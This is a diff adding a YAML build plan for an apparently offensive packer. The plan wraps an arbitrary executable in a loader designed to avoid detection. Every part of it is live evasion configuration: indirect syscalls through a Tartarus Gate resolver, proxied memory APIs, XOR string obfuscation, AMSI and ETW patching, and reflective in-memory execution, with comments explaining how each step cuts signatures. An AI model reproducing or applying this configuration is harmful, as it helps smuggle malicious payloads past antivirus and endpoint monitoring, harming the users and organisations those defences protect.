@@ -1,0 +1,60 @@
+# hidden.yaml — pack one .exe as <name>.hidden.exe with a static-signature baseline.
+#
+#   picaro build examples/plans/hidden.yaml C:\path\payload.exe
+#   -> ./dist/payload.hidden.exe
+#
+# Static-signature baseline: obfuscated strings, indirect syscalls (the Nt*
+# functions never enter the loader's IAT), and API-resolution proxies that serve
+# the payload's own ReadProcessMemory/OpenProcess from the syscall layer instead
+# of the real kernel32/ntdll exports.
+#
+# Needs the `$stem.N$` build-arg token. Without it, use two args and
+# `path: "$arg.1$"` (see the README build-args section).
+
+schema: 6
+name: hidden
+
+build:
+  payloads:
+    payload:
+      source: "$arg.0$"      # the .exe passed on the command line
+      format: pe
+
+  stub:
+    # Indirect syscalls: reach the kernel through ntdll's `syscall; ret` gadget,
+    # so the Nt* functions vanish from the IAT (biggest static-signature cut).
+    syscalls:
+      mode: indirect
+      resolver: tartarus_gate
+    # Serve the payload's catalogue imports from proxies rebuilt on the syscall
+    # layer, so they never resolve to the real kernel32/ntdll exports.
+    # `apis: all` = the whole catalogue (or list specific `dll!func` selectors).
+    # `unmatched: forward` leaves every other import untouched (`abort` would
+    # refuse any payload import outside the catalogue).
+    api_resolution:
+      mode: proxy
+      apis: all
+      unmatched: forward
+    # Obfuscate every stub literal: no cleartext strings in .rdata.
+    strings:
+      strategy: xor
+      key: random
+
+  output:
+    path: "./dist/$stem.0$.hidden.exe"
+    arch: x64
+    strip: true            # drop symbols/debug tables
+    trim_paths: all        # scrub absolute build paths from debug info
+
+runtime:
+  # Light in-process evasion (both resolve their targets dynamically -> no new
+  # static imports).
+  - technique: patch_amsi
+  - technique: patch_etw
+    params: { full: true }
+
+  # Run the PE from memory, nothing written to disk. Terminal -> must be last.
+  # `api_resolution: proxy` needs exactly one Execution step and no
+  # `process_hollowing`, which this plan satisfies.
+  - technique: reflective_loading
+    params: { payload: payload }
